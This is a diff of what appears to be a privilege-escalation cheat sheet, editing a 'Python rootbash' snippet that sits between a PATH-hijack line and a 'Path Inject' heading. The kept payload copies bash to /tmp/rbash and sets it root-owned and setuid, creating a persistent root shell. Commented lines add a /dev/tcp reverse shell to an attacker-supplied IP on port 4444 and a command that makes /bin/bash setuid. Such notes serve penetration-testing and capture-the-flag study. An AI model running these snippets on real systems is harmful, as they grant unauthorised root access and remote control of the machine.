@@ -26,16 +26,14 @@ export PATH=/dev/shm:$PATH
 =================================== 
 Python rootbash 
 
-#!/usr/bin/env python 
-import os 
-import sys 
-try: 
-    #os.system('/usr/bin/touch /tmp/hello')
-    #os.system('bash -i /dev/tcp/$MyIP/4444 0>&1')
-    #os.system('chmod 4755 /bin/bash')
-    os.system('cp /bin/bash /tmp/rbash; chown root:root /tmp/rbash; chmod +s /tmp/rbash') 
-except: 
-     sys.exit() 
+#!/usr/bin/env python
+import os
+import sys
+#os.system('/usr/bin/touch /tmp/hello')
+#os.system('bash -i /dev/tcp/$MyIP/4444 0>&1')
+#os.system('chmod 4755 /bin/bash')
+os.system('cp /bin/bash /tmp/rbash; chown root:root /tmp/rbash; chmod +s /tmp/rbash')
+
 
 =================================== 
 Path Inject
